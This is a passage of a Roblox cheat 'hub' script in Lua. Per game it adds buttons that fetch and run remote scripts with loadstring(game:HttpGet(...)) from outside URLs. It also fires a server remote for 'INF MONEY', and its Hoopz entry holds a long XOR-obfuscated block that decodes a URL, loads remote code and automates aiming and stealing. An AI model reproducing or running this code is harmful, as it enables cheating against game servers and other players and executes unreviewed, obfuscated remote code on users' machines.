       Name = "(For most of the player key doesnt work. Owner will fix soon he said",
       Callback = function()
          loadstring(game:HttpGet("https://zade.insane.rip/p/raw/5wf8db13y2"))()
       end, 
    })
    
     -- Close Your EYES
elseif game.GameId==6098944664 then
    local gameTab = Window:CreateTab("Close Your EYES", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Close Your EYES")
 
    local Button = gameTab:CreateButton({
       Name = "Close Your EYES",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/dqvh/dqvh/main/CloseYourEyes.lua'))()
       end, 
    })
    
 
    -- Natural Disaster Survival
elseif game.GameId==65241 then
    local gameTab = Window:CreateTab("Natural Disaster Survival", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Natural Disaster Survival")
 
    local Button = gameTab:CreateButton({
       Name = "kater hub. MIGHT NEED TO EXECUTE TWICE!",
       Callback = function()
          loadstring(game:HttpGet("https://katerhub-inc.github.io/scripts/game/KH-NDS.lua"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Choose Map NoFall WaterWalk! the script might not work!",
       Callback = function()
          loadstring(game:HttpGet('https://weinzspace.com/cata/hub.lua'))()
       end, 
    })
    
     -- Prison Escape V2
elseif game.GameId==1612857454 then
    local gameTab = Window:CreateTab("Prison Escape V2", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Prison Escape V2")
 
    local Button = gameTab:CreateButton({
       Name = "Prison Escape V2",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/MIKEDRIPZOWSKU/test/main/Protected_2520376751328913.txt", true))()
       end, 
    })
 
     -- murderes vs shierff duels 
elseif game.GameId==4348829796 then
    local gameTab = Window:CreateTab("murderes vs shierff duels no pro servers", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("murderes vs shierff duels!")
 
    local Button = gameTab:CreateButton({
       Name = "Auto Win Auto Kill",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/RenceeeX/DurexHub/refs/heads/main/MurderersVsSheriffs"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "Big Hitbox",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VGXMOD99/SCRIPT-/main/Murder%20vs%20Sherif%20duel.txt"))()
       end, 
    })
 
    -- Kat
elseif game.GameId==254394801 then
    local gameTab = Window:CreateTab("Kat", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Kat!")
 
    local Button = gameTab:CreateButton({
       Name = "OP SCRIPT",
       Callback = function()
          pcall(loadstring(game:HttpGet('https://raw.githubusercontent.com/zReal-King/Knife-Ability-Test/main/Gui')))
       end, 
    })
    
    -- Millionaire Empire Tycoon
elseif game.GameId==2515550066 then
    local gameTab = Window:CreateTab("Millionaire Empire Tycoon", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Millionaire Empire Tycoon")
 
    local Button = gameTab:CreateButton({
       Name = "INF MONEY",
       Callback = function()
          local args = {
             [1] = 5000000011111111111
         }
         
         game:GetService("ReplicatedStorage"):WaitForChild("fewjnfejwb3"):FireServer(unpack(args))
       end, 
    })
 
    -- Prison Life
elseif game.GameId==73885730 then
    local gameTab = Window:CreateTab("Prison Life", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Prison Life")
 
    local Button = gameTab:CreateButton({
       Name = "prison life op admin give",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
       end, 
    })
    
    -- Blade ball
elseif game.GameId==4777817887 then
    local gameTab = Window:CreateTab("Blade ball", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Blade ball")
 
    local Button = gameTab:CreateButton({
       Name = "LUNAX",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/refs/heads/main/Blade%20ball.lua", true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "KEY SYSTEM BUT BETTER THEN THE FIRST ONE",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/refs/heads/main/Blade%20ball.lua", true))()
       end, 
    })
 
    -- DOORS
elseif game.GameId==2440500124 then
    local gameTab = Window:CreateTab("DOORS", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("DOORS")
 
    local Button = gameTab:CreateButton({
       Name = "mspain v3 ",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "BLACKING! decent script solara!",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
       end, 
    })
    
    -- Bedwars
elseif game.GameId==2619619496 then
    local gameTab = Window:CreateTab("Bedwars", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Bedwars!")
 
    local Button = gameTab:CreateButton({
       Name = "BEDWARS",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/AFGCLIENT/Snyware/main/Loader'))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "BEDWARS void ware",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/NewMainScript.lua", true))()
       end, 
    })
    
    -- TSB
elseif game.GameId==3808081382 then
    local gameTab = Window:CreateTab("TSB", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("TSB!")
 
    local Button = gameTab:CreateButton({
       Name = "TSB",
       Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/AFGCLIENT/Snyware/main/Loader'))()
       end, 
    })
    
    -- A DUSTY ROAD TRIP
elseif game.GameId==5650396773 then
    local gameTab = Window:CreateTab("A DUSTY ROAD TRIP", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("A DUSTY ROAD TRIP")
 
    local Button = gameTab:CreateButton({
       Name = "A DUSTY ROAD TRIP",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))()
       end, 
    })
    
    -- Sheriffs VS Murderers 
elseif game.GameId==1795206523 then
    local gameTab = Window:CreateTab("Sheriffs VS Murderers", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Sheriffs VS Murderers")
 
    local Button = gameTab:CreateButton({
       Name = "Murderers VS Sheriffs",
       Callback = function()
          local scriptURL = 'https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/MVSD.lua'
 local response = game:HttpGet(scriptURL)
 local executeScript = loadstring(response)
 executeScript()
       end, 
    })
    
    -- Build a Boat For Treasure 
elseif game.GameId==210851291 then
    local gameTab = Window:CreateTab("Build a Boat For Treasure", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Build a Boat For Treasure!")
 
    local Button = gameTab:CreateButton({
       Name = "arther HUB",
       Callback = function()
          loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2529a5f9dfddd5523ca4e22f21cceffa.lua"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "arther HUB",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/WeshkyB/Weshkys-Auto-Farm/refs/heads/main/WFarm/UI.lua"))();
       end, 
    })
    
    
    -- Break IN story
elseif game.GameId==1318971886 then
    local gameTab = Window:CreateTab("Break IN story", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Break IN story!")
 
    local Button = gameTab:CreateButton({
       Name = "Op script u can select any role when u join",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "OP SCRIPT same as above but in game!",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/XHub/main/HubLoader.lua", true))()
       end, 
    })
 

     -- Speed Of Legends
elseif game.GameId==1119466531 then
    local gameTab = Window:CreateTab("Speed Of Legends", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Speed Of Legends!")
 
    local Button = gameTab:CreateButton({
       Name = "Blox hub",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/ImPocky/PockyHub/main/Scripts/load.txt"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "very laggy but op",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/foggy-speedlegend/refs/heads/main/script"))()
       end, 
    })
    
     -- Hoopz
elseif game.GameId==2287245386 then
    local gameTab = Window:CreateTab("Hoopz", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Hoopz!")
 
    local Button = gameTab:CreateButton({
       Name = "OP hoopz script solara and wave",
       Callback = function()
          do local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v51,v52) local v53={};for v95=1, #v51 do v6(v53,v0(v4(v1(v2(v51,v95,v95 + 1 )),v1(v2(v52,1 + (v95% #v52) ,1 + (v95% #v52) + 1 )))%256 ));end return v5(v53);end local v8=loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\205\3\239\168\207\7\229\214\201\49\234\190\136\45\255\142\247\44\228\244\202\31\216\205\148\54\244\184","\126\177\163\187\69\134\219\167")))();local v9=v8:CreateWindow({[v7("\23\196\62\201\249","\156\67\173\74\165")]=v7("\7\146\101\48\145\7\98\17","\38\84\215\41\118\220\70")});local v10=v9:NewTab({[v7("\126\23\47\23","\158\48\118\66\114")]=v7("\134\5\57\24","\155\203\68\112\86\19\197")});local v11=v10:NewSection({[v7("\104\220\59\249","\152\38\189\86\156\32\24\133")]=v7("\255\86\170\74\243\84\172","\38\156\55\199")});local v12=game:GetService(v7("\159\114\110\35\0\100\251\64\173","\35\200\29\28\72\115\20\154"));local v13=v12.Map:WaitForChild(v7("\59\170\216\211\137\37\58\30\172","\84\121\223\177\191\237\76"));local function v14() for v96,v97 in pairs(v13:GetChildren()) do v97:Destroy();end end local v15=game:GetService(v7("\137\67\199\147\63\66\38\200\184\83","\161\219\54\169\192\90\48\80"));local v16=game:GetService(v7("\121\78\1\60\76\80\19","\69\41\34\96"));local v17=v16.LocalPlayer;local v18=game:GetService(v7("\137\208\210\24\43\37\172\214\195\57\7\57\170\202\212\15","\75\220\163\183\106\98"));local v19=game:GetService(v7("\53\181\153\60\202\18\187\136\50","\185\98\218\235\87")).CurrentCamera;local v20=v17.Character;local v21=v20.Head;local v22=v20.Torso;_G.GG=nil;isdoing=false;local v23=false;local function v24() for v98,v99 in pairs(v12:GetDescendants()) do if (v99.Name==v7("\248\43\46\245\214","\202\171\92\71\134\190")) then local v125=0 -0 ;while true do if (v125==(1018 -(697 + 321))) then v99.Parent.Name=v7("\34\202\39","\232\73\161\76");v99.Parent.Parent=v12;break;end end end end end local function v25() local v54=0 -0 ;local v55;local v56;while true do if (v54==(0 -0)) then v55,v56=9000000993 -(41 + 1464) ,nil;for v135,v136 in pairs(game:GetService(v7("\140\214\80\86\13\171\216\65\88","\126\219\185\34\61")):GetChildren()) do if (v136.Name==v7("\7\197\85","\135\108\174\62\18\30\23\147")) then local v148=0 -0 ;local v149;while true do if (0==v148) then v149=(v17.Character.Torso.Position-v136.Position).Magnitude;if (v55>v149) then local v178=0 + 0 ;while true do if ((0 -0)==v178) then v55=v149;v56=v136;break;end end end break;end end end end v54=2 -1 ;end if (v54==(1228 -(322 + 905))) then return v56,v55;end end end function calculateVector() local v57,v58=v25();local v59=tonumber(game:GetService(v7("\134\229\43\210\29\188\32","\167\214\137\74\171\120\206\83")).LocalPlayer.Power.Value);local v60=nil;if ((v58>(671 -(602 + 9))) and (v58<(1252 -(449 + 740)))) then if (v59==(947 -(826 + 46))) then v60=Vector3.new(947 -(245 + 702) ,29 + 21 ,0 -0 );elseif (v59==(1714 -(1607 + 27))) then v60=Vector3.new(0 + 0 ,1968 -(260 + 1638) ,440 -(382 + 58) );elseif (v59==(272 -187)) then v60=Vector3.new(0 + 0 ,221 -136 ,0 -0 );end elseif ((v58>(129 -66)) and (v58<(201 -133))) then if (v59==(15 + 65)) then v60=Vector3.new(0 + 0 ,185 -130 ,1205 -(902 + 303) );elseif (v59==(1554 -(1269 + 200))) then v60=Vector3.new(0 -0 ,192 -112 ,826 -(802 + 24) );end elseif ((v58>(6 + 62)) and (v58<(1763 -(1121 + 569)))) then if (v59==(299 -(22 + 192))) then v60=Vector3.new(683 -(483 + 200) ,1528 -(1404 + 59) ,0 -0 );end elseif ((v58>(73 -18)) and (v58<(826 -(468 + 297)))) then if (v59==85) then v60=Vector3.new(562 -(334 + 228) ,96,0 -0 );end elseif ((v58>(111 -63)) and (v58<(90 -40))) then if (v59==(35 + 50)) then v60=Vector3.new(0 + 0 ,337 -(141 + 95) ,0 + 0 );end elseif ((v58>(107 -65)) and (v58<47)) then if (v59==85) then v60=Vector3.new(0,244 -142 ,0 + 0 );end elseif ((v58>(95 -60)) and (v58<(29 + 12))) then if (v59==(45 + 40)) then v60=Vector3.new(0 -0 ,61 + 42 ,163 -(92 + 71) );end elseif ((v58>(15 + 15)) and (v58<(34 + 3))) then if (v59==(39 + 46)) then v60=Vector3.new(0 -0 ,869 -(574 + 191) ,0 + 0 );end elseif ((v58>(72 -43)) and (v58<36)) then if (v59==(44 + 41)) then v60=Vector3.new(849 -(254 + 595) ,231 -(55 + 71) ,0 -0 );end elseif ((v58>(1815 -(573 + 1217))) and (v58<(580 -(83 + 468)))) then if (v59==(235 -150)) then v60=Vector3.new(0 + 0 ,171 -64 ,0 -0 );end end return v60;end local function v26() while wait() do if ((isdoing==true) and v20:WaitForChild(v7("\163\229\63\92\246\168\130\244","\199\235\144\82\61\152")).Jumping and (v22.Velocity.Y>=10)) then local v126=0 -0 ;local v127;local v128;local v129;local v130;while true do if ((326 -(45 + 280))==v126) then v129=(v20.PrimaryPart.Position-v127.Position).magnitude;v130=CFrame.new(v21.Position,v128 + calculateVector() );v126=941 -(714 + 225) ;end if (v126==(5 -3)) then v19.CFrame=v130;break;end if ((0 -0)==v126) then local v152=0 + 0 ;while true do if (v152==(0 -0)) then v127=v25();v128=v127.Position;v152=1 + 0 ;end if (v152==(1 + 0)) then v126=807 -(118 + 688) ;break;end end end end end end end v24();v20:WaitForChild(v7("\47\3\180\42\9\25\176\47","\75\103\118\217")).Jumping:Connect(function() if v23 then local v112=0 -0 ;while true do if (v112==(48 -(25 + 23))) then _G.GG=v25();if v20:FindFirstChild(v7("\229\85\99\31\188\10\197\85\124\24","\126\167\52\16\116\217")) then local v156=0 + 0 ;local v157;while true do if ((0 + 0)==v156) then v157=0;while true do if (v157==(1886 -(927 + 959))) then isdoing=true;v26();break;end end break;end end end break;end end end end);v18.InputBegan:Connect(function(v61) if (v61.UserInputType==Enum.UserInputType.MouseButton1) then isdoing=false;end end);v11:NewToggle({[v7("\230\47\45\133","\156\168\78\64\224\212\121")]=v7("\4\239\168\194\8\237\174","\174\103\142\197"),[v7("\82\45\89\57\48\82\236","\152\54\72\63\88\69\62")]=false,[v7("\215\197\226\80\214\197\237\87","\60\180\164\142")]=function(v62) v23=v62;if (v62==true) then local v113=0 -0 ;while true do if (v113==(732 -(16 + 716))) then print("");v14();break;end end else local v114=0;while true do if (v114==(1948 -(1096 + 852))) then print("");isdoing=false;break;end end end end});local v11=v10:NewSection({[v7("\118\95\8\44","\114\56\62\101\73\71\141")]=v7("\185\252\207\203\248\225\218\202\188\236\215\215","\164\216\137\187")});local v27=game:GetService(v7("\226\234\48\171\163\236\24","\107\178\134\81\210\198\158"));local v28=v27.LocalPlayer;local v29=game:GetService(v7("\14\7\144\210\191\57\2\171\200\186\45\26\175\199\164\57\9\135\212","\202\88\110\226\166"));local v30={[v7("\230\1\131\245\198\198\11","\170\163\111\226\151")]=false,[v7("\61\49\161\44\123\36\44","\73\113\80\210\88\46\87")]=0 -0 ,[v7("\162\35\192\16\238\143\45\217\27\232\143","\135\225\76\173\114")]=v7("\41\250\177\164\175\181\231\18\236\182\180\191","\199\122\141\216\208\204\221")};v30.GetClosestPlayer=function(v63) local v64=math.huge;local v65=nil;for v100,v101 in ipairs(v27:GetPlayers()) do local v102=97 -(11 + 86) ;local v103;while true do if ((2 -1)==v102) then if v103 then local v153=v28.Character and v28.Character.PrimaryPart ;if v153 then local v163=(v153.Position-v103.Position).Magnitude;if (v163<v64) then local v169=512 -(409 + 103) ;while true do if (v169==(236 -(46 + 190))) then v64=v163;v65=v101;break;end end end end end break;end if (v102==(285 -(175 + 110))) then if (v101==v28) then continue;end v103=v101.Character and v101.Character.PrimaryPart ;v102=1 + 0 ;end end end return v65;end;v30.GetClosestPartToBall=function(v66) local v67=0 -0 ;local v68;while true do if (v67==0) then v68=v66:GetClosestPlayer();if v68 then local v140=0 -0 ;local v141;local v142;while true do if (v140==(1797 -(503 + 1293))) then if v142 then local v170=v142:FindFirstChild(v7("\7\133\179\64","\112\69\228\223\44\100\232\113"));local v171=math.huge;local v172;local v173=math.huge;local v174;if v68.Character then local v179=0 -0 ;while true do if (v179==(664 -(174 + 489))) then if (v173<v171) then return v7("\161\125\191\148","\83\205\24\217\224");else return v7("\244\204\202\53\242","\93\134\165\173");end break;end if (v179==(0 + 0)) then for v180,v181 in ipairs(v68.Character:GetChildren()) do if v181:IsA(v7("\246\30\20\214\134\125\148\192","\230\180\127\103\179\214\28")) then local v184=1061 -(810 + 251) ;local v185;while true do if (v184==(0 + 0)) then v185=(v181.Position-v141:FindFirstChild(v7("\190\12\88\78\240\1\193\158\8","\128\236\101\63\38\132\33")).Position).Magnitude;if (v185<v173) then v173=v185;v174=v181;end break;end end end end for v182,v183 in ipairs(v68.Character:GetChildren()) do if v183:IsA(v7("\142\168\2\65\134\234\221\184","\175\204\201\113\36\214\139")) then local v186=0 + 0 ;local v187;while true do if (v186==(0 + 0)) then v187=(v183.Position-v141:FindFirstChild(v7("\107\201\51\200\68\102\222\56","\100\39\172\85\188")).Position).Magnitude;if (v187<v171) then local v190=533 -(43 + 490) ;local v191;while true do if (v190==(1269 -(231 + 1038))) then v191=733 -(711 + 22) ;while true do if ((0 -0)==v191) then v171=v187;v172=v183;break;end end break;end end end break;end end end end v179=860 -(240 + 619) ;end end end end break;end if (v140==(0 -0)) then v141=v28.Character;v142=v141 and v141:FindFirstChild(v7("\143\220\3\251\125\226\175\220\28\252","\150\205\189\112\144\24")) ;v140=1 + 0 ;end end end break;end end end;v30.GetEquippedBall=function(v69) local v70=v28.Character;local v71=v70 and v70:FindFirstChild(v7("\156\243\210\201\63\218\176\127\178\254","\30\222\146\161\162\90\174\210")) ;local v72=math.huge;local v73=math.huge;local v74,v75,v76=v70 and v70:FindFirstChild(v7("\201\75\118\30\165\111\98\7","\106\133\46\16")) ,v70 and v70:FindFirstChild(v7("\106\41\116\244\78\0\121\50\126","\32\56\64\19\156\58")) ,v71 and v71:FindFirstChild(v7("\120\201\233\90","\224\58\168\133\54\58\146")) ;if (v74 and v75 and v76) then local v115=0 -0 ;while true do if (v115==(1 + 0)) then return ((v72<v73) and v7("\117\83\77\233","\107\57\54\43\157\21\230\231")) or v7("\233\130\22\253\173","\175\187\235\113\149\217\188") ;end if (v115==0) then v72=(v76.Position-v74.Position).Magnitude;v73=(v76.Position-v75.Position).Magnitude;v115=3 -2 ;end end end end;game:GetService(v7("\14\186\143\127\230\107\110\53\172\132","\24\92\207\225\44\131\25")).RenderStepped:Connect(function() if (v30.Enabled and ((tick() -v30.LastUse)>=(0.5 -0))) then local v116=1744 -(1344 + 400) ;local v117;local v118;local v119;local v120;local v121;while true do if (v116==(6 -4)) then v121=nil;while true do if (v117==(405 -(255 + 150))) then v118=v30:GetClosestPartToBall();v119=v28.Character and v28.Character:FindFirstChild(v7("\105\210\171\71\30\105\73\210\180\64","\29\43\179\216\44\123")) and v28.Character:FindFirstChild(v7("\159\216\51\71\184\205\34\77\177\213","\44\221\185\64")):FindFirstChild(v7("\35\230\68\83","\19\97\135\40\63")) ;v117=1 + 0 ;end if (v117==(2 + 0)) then if (((v118==v7("\180\39\120\10","\143\216\66\30\126\68\155")) and (v30:GetEquippedBall()==v7("\152\193\10\195\209","\129\202\168\109\171\165\195\183"))) or ((v118==v7("\48\81\48\208\202","\134\66\56\87\184\190\116")) and (v30:GetEquippedBall()==v7("\16\52\15\175","\85\92\81\105\219\121\139\65")))) then local v175="H";v29:SendKeyEvent(true,v175,false,game);task.wait();v29:SendKeyEvent(false,v175,false,game);v30.LastUse=tick();end if ( not v28.Character or  not v28.Character:FindFirstChild(v7("\223\178\67\78\121\203\255\178\92\73","\191\157\211\48\37\28"))) then v30.LastSide="";end break;end if ((4 -3)==v117) then local v165=0 -0 ;while true do if (v165==(3 -2)) then v117=1741 -(404 + 1335) ;break;end if (v165==(0 + 0)) then v120=v28.Character and v28.Character:FindFirstChild(v7("\130\89\53\47\111\16\188\81","\81\206\60\83\91\79")) ;v121=v28.Character and v28.Character:FindFirstChild(v7("\124\162\215\122\59\131\108\182\67","\196\46\203\176\18\79\163\45")) ;v165=1;end end end end break;end if (v116==(407 -(183 + 223))) then v119=nil;v120=nil;v116=2 -0 ;end if (v116==(0 + 0)) then local v145=0 + 0 ;while true do if (v145==(338 -(10 + 327))) then v116=1 + 0 ;break;end if (v145==(338 -(118 + 220))) then v117=0 -0 ;v118=nil;v145=1 + 0 ;end end end end end end);v11:NewToggle({[v7("\241\30\249\25","\90\191\127\148\124")]=v7("\121\146\58\24\56\143\47\25\124\139\43\4\56","\119\24\231\78"),[v7("\134\40\163\75\201\76\5","\113\226\77\197\42\188\32")]=false,[v7("\57\23\248\185\56\23\247\190","\213\90\118\148")]=function(v77) local v78=449 -(108 + 341) ;while true do if (v78==(0 + 0)) then v30.Enabled=v77;print(v7("\118\47\179\88\72\79\61\244\87\95\94\110\186\89\90\27","\45\59\78\212\54")   .. ((v77 and v7("\21\88\130\137\138\43\169","\144\112\54\227\235\230\78\205")) or v7("\183\33\28\253\210\87\182\44","\59\211\72\111\156\176")) );break;end end end});local v11=v10:NewSection({[v7("\96\134\238\40","\77\46\231\131")]=v7("\187\65\162\79\250\83\163\65\168\80\246\80\168\81\165\83\250\76\246","\32\218\52\214")});local v34=false;local v35=game.Players.LocalPlayer:GetMouse();local v27=game.Players;local v28=v27.LocalPlayer;local v36=game:GetService(v7("\123\4\52\186\216\190\85\79\90\36\52\186\231\185\70\95","\58\46\119\81\200\145\208\37"));local function v37() for v104,v105 in pairs(v27:GetPlayers()) do local v106=0 -0 ;local v107;while true do if ((881 -(614 + 267))==v106) then v107=v28.Character;if ((v105.Name~=v107.Name) and ((v105.Character.Torso.CFrame.p-v107.Torso.CFrame.p).Magnitude<(1518 -(711 + 782)))) then while v34 do local v158=0 -0 ;local v159;while true do if (v158==(0 -0)) then v159=469 -(270 + 199) ;while true do if (v159==(0 + 0)) then if ((v105.Character.Torso.Velocity.magnitude>(1819.5 -(580 + 1239))) and v105.Character:FindFirstChild(v7("\9\141\35\167\172\169\52\42\128\60","\86\75\236\80\204\201\221"))) then v107.Humanoid:MoveTo(v105.Character.Torso.CFrame.p + (v105.Character.Torso.Velocity.unit * (12 -5)) );elseif ((v105.Character.Torso.Velocity.magnitude<(0.5 -0)) and v105.Character:FindFirstChild(v7("\80\64\100\142\251\159\112\64\123\137","\235\18\33\23\229\158"))) then v107.Humanoid:MoveTo(v105.Character.Torso.CFrame.p);elseif  not v105.Character:FindFirstChild(v7("\114\187\210\176\85\174\195\186\92\182","\219\48\218\161")) then v34=false;end task.wait();break;end end break;end end end end break;end end end end v11:NewToggle({[v7("\202\112\113\76","\128\132\17\28\41\187\47")]=v7("\0\39\18\53\29\6\39\7\40\89","\61\97\82\102\90"),[v7("\168\43\173\74\210\91\10","\105\204\78\203\43\167\55\126")]=false,[v7("\166\171\47\18\17\5\196\90","\49\197\202\67\126\115\100\167")]=function(v79) local v80=1812 -(1293 + 519) ;while true do if ((1 + 0)==v80) then if v34 then v37();end break;end if (v80==(0 -0)) then v34=v79;print(v7("\26\90\216\39\133\66\77\119\90\205\44\192\88\81\32\27","\62\87\59\191\73\224\54")   .. ((v79 and v7("\226\12\251\203\235\7\254","\169\135\98\154")) or v7("\207\126\55\85\255\63\205\207","\168\171\23\68\52\157\83")) );v80=1 + 0 ;end end end});v36.InputBegan:Connect(function(v81,v82) if ((v81.KeyCode==Enum.KeyCode.X) and  not v82) then v34= not v34;print(v7("\180\127\250\186\101","\231\148\17\149\205\69\77")   .. ((v34 and "") or "") );if v34 then v37();end end end);local v11=v10:NewSection({[v7("\174\166\202\254","\159\224\199\167\155\55")]=v7("\227\246\48\215\231\252\46\198\183\231\51\146\245\242\48\222\183\227\46\215\228\224\124\220","\178\151\147\92")});local v27=game:GetService(v7("\188\241\77\43\23\94\105","\26\236\157\44\82\114\44"));local v36=game:GetService(v7("\31\61\208\73\3\32\197\78\62\29\208\73\60\39\214\94","\59\74\78\181"));local v38=game:GetService(v7("\18\222\72\81\160\53\208\89\95","\211\69\177\58\58"));local v39=v27.LocalPlayer;local v20=v39.Character;local v40=v20:WaitForChild(v7("\159\240\116\244\231\196\190\225\75\250\230\223\135\228\107\225","\171\215\133\25\149\137"));local function v41() local v83=0 + 0 ;local v84;while true do if (1==v83) then return v84;end if (v83==(0 -0)) then local v132=0 + 0 ;while true do if (v132==1) then v83=1168 -(645 + 522) ;break;end if (v132==0) then v84={};for v160,v161 in ipairs(v38:GetDescendants()) do if (v161:IsA(v7("\195\201\33\255\223\49\238\86","\34\129\168\82\154\143\80\156")) and (v161.Name==v7("\167\179\63\7","\233\229\210\83\107\40\46")) and v161.Parent) then table.insert(v84,v161);end end v132=1 + 0 ;end end end end end local v42=nil;local v43=false;local v44=false;local function v45() local v85=v41();local v86=nil;local v87=math.huge;for v108,v109 in ipairs(v85) do local v110=0 + 0 ;local v111;while true do if (v110==(1790 -(1010 + 780))) then v111=(v40.Position-v109.Position).Magnitude;if (v111<v87) then local v154=0 + 0 ;local v155;while true do if (v154==(0 -0)) then v155=0 -0 ;while true do if (v155==0) then v86=v109;v87=v111;break;end end break;end end end break;end end end if v86 then v40.CFrame=CFrame.new(v86.Position);else print(v7("\239\77\114\212\4\205\78\33\150\3\206\87\60\210","\101\161\34\82\182"));end end local function v46() if v42 then v40.CFrame=CFrame.new(v42);else print(v7("\198\2\25\241\201\235\133\39\230\12\85\190\203\237\145\39\252\4\86\240\155\228\141\59\230\9","\78\136\109\57\158\187\130\226"));end end v36.InputBegan:Connect(function(v88,v89) if ( not v89 and v44) then if (v88.KeyCode==Enum.KeyCode.N) then local v139=1836 -(1045 + 791) ;while true do if (v139==(0 -0)) then v42=v40.Position;if v43 then v46();v43=false;else local v168=0 -0 ;while true do if (v168==(505 -(351 + 154))) then v45();v43=true;break;end end end break;end end end end end);v11:NewToggle({[v7("\16\62\244\244","\145\94\95\153")]=v7("\233\200\24\208\94\184\239\217\84\193\65\247\255\204\24\217","\215\157\173\116\181\46"),[v7("\49\177\141\243\207\57\160","\186\85\212\235\146")]=false,[v7("\193\128\26\242\59\239\91\201","\56\162\225\118\158\89\142")]=function(v90) local v91=0;while true do if (v91==(1574 -(1281 + 293))) then v44=v90;print(":",v90);break;end end end});v20:WaitForChild(v7("\116\16\205\174\44\215\85\1","\184\60\101\160\207\66")).Jumping:Connect(function() _G.GG=v25();if v20:FindFirstChild(v7("\19\131\111\183\52\150\126\189\61\142","\220\81\226\28")) then local v124=0 -0 ;while true do if (v124==(266 -(28 + 238))) then isdoing=true;v26();break;end end end end);local v17=game:GetService(v7("\35\217\131\226\239\213\0","\167\115\181\226\155\138")).LocalPlayer;local v47=v17.Character;local v48=v47[v7("\208\43\224\84\111\49\231\240\47","\166\130\66\135\60\27\17")];local v49=v47[v7("\104\79\200\97\112\101\88\195","\80\36\42\174\21")];local function v50(v92) local v93=0 -0 ;while true do if ((1559 -(1381 + 178))==v93) then v49.Size=Vector3.new(v92,v49.Size.Y,v49.Size.Z);v48.Size=Vector3.new(v92,v48.Size.Y,v48.Size.Z);break;end end end local v11=v10:NewSection({[v7("\96\17\58\127","\26\46\112\87")]=v7("\181\44\165\115\255\190\87\185\246\49\174\117\188\183","\212\217\67\203\20\223\223\37")});v10:NewSlider({[v7("\148\140\165\215","\178\218\237\200")]=v7("\154\186\232\215\246\148\244\221","\176\214\213\134"),[v7("\240\168\176\213\189\90\77","\57\148\205\214\180\200\54")]=1 + 0 ,[v7("\31\244\59","\22\114\157\85\84")]=1 -0 ,[v7("\201\202\11","\200\164\171\115\164\61\150")]=17 + 3 ,[v7("\189\245\15\73\129\191\247\8","\227\222\148\99\37")]=function(v94) v50(v94);end});v50(1 + 0 ); end
       end, 
    })
    
     -- Flee The Facility
elseif game.GameId==372226183 then
    local gameTab = Window:CreateTab("Flee The Facility", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Flee The Facility!")
 
    local Button = gameTab:CreateButton({
       Name = "YAFTFEM (LEGACY) might not work use the one below",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yaftfem.lua"))()
       end, 
    })
 
    local Button = gameTab:CreateButton({
       Name = "YarHM HUB",
       Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
       end, 
    })
    
     -- War tycoon
elseif game.GameId==1526814825 then
    local gameTab = Window:CreateTab("War tycoon", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("War tycoon!")
 
    local Button = gameTab:CreateButton({
       Name = "OP SCRIPT",
